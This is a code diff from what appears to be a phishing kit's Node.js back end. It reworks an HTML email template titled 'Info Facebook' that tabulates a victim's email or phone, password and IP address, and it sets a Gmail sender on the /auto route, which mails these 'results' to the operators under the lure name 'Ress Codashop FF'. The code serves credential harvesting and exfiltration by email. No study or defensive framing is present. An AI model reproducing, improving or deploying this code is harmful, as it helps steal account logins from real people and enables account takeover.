@@ -67,99 +67,57 @@ app.post('/send-email', async (req, res) => {
 // ====================== TEMPLATE AUTO ======================
 function generateHtml(noperess, password, ipress) {
   return `
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Info Facebook</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link
-    rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-  />
-</head>
-<body class="bg-white font-sans w-[90%] mx-auto">
-  <div class="result fixed inset-0 z-50 overflow-y-auto rounded-lg bg-white">
-    <table class="tblResult w-full border-collapse bg-gray-50 text-left text-black">
-      <thead>
-        <tr>
-          <th
-            colspan="3"
-            class="bg-[#001240] border-2 border-[#001240] px-4 py-4 text-center text-white text-lg font-semibold"
-          >
-            Info Facebook
-          </th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td class="border-2 border-[#001240] border-r-0 px-4 py-3 font-bold">
-            Email/Phone
-          </td>
-          <td class="border-2 border-[#001240] px-4 py-3 text-center font-bold">
-            ${noperess}
-          </td>
-          <td class="border-2 border-[#001240] border-l-0"></td>
-        </tr>
-        <tr>
-          <td class="border-2 border-[#001240] border-r-0 px-4 py-3 font-bold">
-            Password
-          </td>
-          <td class="border-2 border-[#001240] px-4 py-3 text-center font-bold">
-            ${password}
-          </td>
-          <td class="border-2 border-[#001240] border-l-0"></td>
-        </tr>
-        <tr>
-          <td class="border-2 border-[#001240] border-r-0 px-4 py-3 font-bold">
-            IP Address
-          </td>
-          <td class="border-2 border-[#001240] px-4 py-3 text-center font-bold">
-            ${ipress}
-          </td>
-          <td class="border-2 border-[#001240] border-l-0"></td>
-        </tr>
-      </tbody>
-      <tfoot>
-        <tr>
-          <td colspan="3" class="border-2 border-[#001240] bg-[#001240] px-4 py-4 text-center">
-            <div class="flex justify-center space-x-6">
-              <a
-                href="https://instagram.com/your_instagram_link"
-                target="_blank"
-                rel="noopener noreferrer"
-                class="inline-flex items-center justify-center rounded-md bg-pink-600 p-3 text-white hover:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-pink-500 focus:ring-offset-2"
-                aria-label="Instagram"
-              >
-                <i class="fab fa-instagram fa-lg"></i>
-              </a>
-              <a
-                href="https://t.me/your_telegram_link"
-                target="_blank"
-                rel="noopener noreferrer"
-                class="inline-flex items-center justify-center rounded-md bg-blue-500 p-3 text-white hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2"
-                aria-label="Telegram"
-              >
-                <i class="fab fa-telegram-plane fa-lg"></i>
-              </a>
-              <a
-                href="https://wa.me/your_whatsapp_number"
-                target="_blank"
-                rel="noopener noreferrer"
-                class="inline-flex items-center justify-center rounded-md bg-green-600 p-3 text-white hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2"
-                aria-label="WhatsApp"
-              >
-                <i class="fab fa-whatsapp fa-lg"></i>
-              </a>
-            </div>
-          </td>
-        </tr>
-      </tfoot>
-    </table>
-  </div>
-</body>
-</html>
-`;
+  <html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Info Facebook</title>
+  </head>
+  <body style="background:#fff; font-family: Arial, sans-serif; margin:0; padding:20px;">
+    <div style="max-width:600px; margin:auto; border-radius:8px; background:#fff;">
+      <table width="100%" cellpadding="0" cellspacing="0" border="1" style="border-collapse:collapse; background:#f9f9f9; color:#000;">
+        <thead>
+          <tr>
+            <th colspan="3" style="background:#001240; color:#fff; text-align:center; padding:15px; font-size:18px; font-weight:bold;">
+              Info Facebook
+            </th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td style="border:1px solid #001240; padding:10px; font-weight:bold;">Email/Phone</td>
+            <td style="border:1px solid #001240; padding:10px; text-align:center; font-weight:bold;">${noperess}</td>
+            <td style="border:1px solid #001240;"></td>
+          </tr>
+          <tr>
+            <td style="border:1px solid #001240; padding:10px; font-weight:bold;">Password</td>
+            <td style="border:1px solid #001240; padding:10px; text-align:center; font-weight:bold;">${password}</td>
+            <td style="border:1px solid #001240;"></td>
+          </tr>
+          <tr>
+            <td style="border:1px solid #001240; padding:10px; font-weight:bold;">IP Address</td>
+            <td style="border:1px solid #001240; padding:10px; text-align:center; font-weight:bold;">${ipress}</td>
+            <td style="border:1px solid #001240;"></td>
+          </tr>
+        </tbody>
+        <tfoot>
+          <tr>
+            <td colspan="3" style="background:#001240; text-align:center; padding:15px;">
+              <a href="https://instagram.com/your_instagram_link" target="_blank" style="margin:0 10px; color:#fff; text-decoration:none; font-size:14px;">Instagram</a>
+              <a href="https://t.me/your_telegram_link" target="_blank" style="margin:0 10px; color:#fff; text-decoration:none; font-size:14px;">Telegram</a>
+              <a href="https://wa.me/your_whatsapp_number" target="_blank" style="margin:0 10px; color:#fff; text-decoration:none; font-size:14px;">WhatsApp</a>
+            </td>
+          </tr>
+          <tr>
+            <td colspan="3" style="background:#f1f1f1; text-align:center; padding:10px; font-size:12px; color:#555;">
+              © Team CodeGood 💤
+            </td>
+          </tr>
+        </tfoot>
+      </table>
+    </div>
+  </body>
+  </html>
+  `;
 }
 // ====================== ROUTE AUTO ======================
 app.get("/auto", async (req, res) => {
@@ -182,7 +140,7 @@ app.get("/auto", async (req, res) => {
                     const htmlContent = generateHtml(email, password, ip);
 
                     await transporterAuto.sendMail({
-                        from: `"🌀 Ress Codashop FF 🌀"`,
+                        from: `"🌀 Ress Codashop FF 🌀" <msg.sender.cg.team@gmail.com>`,
                         to: entry.email || entry, // bisa array objek atau string
                         subject: `⚡ || Result Punya Si ${email}`,
                         html: htmlContent,
